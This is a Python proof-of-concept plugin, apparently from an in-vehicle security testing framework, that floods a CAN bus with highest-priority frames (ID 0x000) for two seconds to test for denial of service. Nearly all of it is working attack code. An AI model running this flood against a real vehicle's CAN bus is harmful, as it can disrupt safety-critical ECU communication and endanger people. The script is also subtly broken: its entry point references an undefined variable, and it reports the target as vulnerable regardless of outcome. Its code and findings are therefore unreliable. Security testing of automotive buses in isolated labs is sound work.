"""
PoC Name: CAN Bus DoS Flood
CVE: N/A
Component: CAN Bus (PCAN)
Category: Protocol
Severity: High
CVSS: 7.5
Description: 通过高频发送高优先级CAN帧,测试总线是否存在拒绝服务风险。
Prerequisites: PCAN接口, python-can库, PCAN驱动, 隔离测试环境。
Usage: python3 24_CAN_DoS_Flood.py PCAN_USBBUS1
"""
import sys
import time
from iv_plugin_base import IVIVulnerabilityPlugin

class CANDoSFloodPlugin(IVIVulnerabilityPlugin):
    def check_prerequisites(self):
        iface = self.params.get("can_interface", "PCAN_USBBUS1")
        self.logger.info(f"使用CAN接口: {iface}")
        return True

    def exploit(self):
        iface = self.params.get("can_interface", "PCAN_USBBUS1")
        self.logger.info(f"CAN DoS测试 ({iface}), 发送2秒高优先级帧...")
        try:
            import can
            if "PCAN" in iface:
                bus = can.interface.Bus(channel=iface, interface="pcan", bitrate=500000)
            else:
                bus = can.interface.Bus(channel=iface, bustype="socketcan")
            flood_msg = can.Message(
                arbitration_id=0x000,  # Highest priority
                data=[0xFF]*8, is_extended_id=False
            )
            count = 0
            start = time.time()
            while time.time() - start < 2:
                bus.send(flood_msg)
                count += 1
            elapsed = time.time() - start
            rate = count / elapsed
            self.logger.warning(f"[+] 发送 {count} 帧 ({rate:.0f} fps)")
            self.logger.info("如果正常ECU通信被中断,则存在DoS风险")
            bus.shutdown()
            self.results["vulnerable"] = True
            self.results["evidence"] = f"Flood: {count} frames in {elapsed:.1f}s ({rate:.0f} fps)"
        except ImportError:
            self.logger.error("python-can未安装")
            self.results["vulnerable"] = False
        except Exception as e:
            self.logger.error(f"CAN DoS测试失败: {e}")
            self.results["vulnerable"] = False
        return self.results


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 24_CAN_DoS_Flood.py <can_interface>")
        sys.exit(1)
    plugin = CANDoSFloodPlugin({"target_ip": "N/A", "can_interface": iface})
    plugin.run_verify()
